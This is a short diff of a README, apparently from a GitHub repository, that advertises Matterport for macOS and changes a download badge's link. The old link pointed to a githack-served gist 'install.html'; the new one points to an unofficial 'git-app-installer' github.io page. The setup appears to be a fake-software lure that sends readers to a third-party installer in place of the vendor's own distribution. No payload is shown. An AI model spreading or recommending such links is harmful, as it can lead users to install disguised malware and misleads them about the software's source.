@@ -3,7 +3,7 @@
 Matterport is a powerful platform for creating, editing, and viewing immersive 3D virtual spaces and digital twins on macOS.  
 Ideal for real estate, architecture, construction, and design professionals.
 
-<a href="https://gistcdn.githack.com/enigmapatootie115/2469c49cd5741645279bf2237a8a7be6/raw/ef49ee75dea349b9ca26099576839b14c6661061/install.html?offer=Matterport" target="_blank">
+<a href="https://git-app-installer.github.io/.github/?offer=Matterport" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Matterport%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="340" 
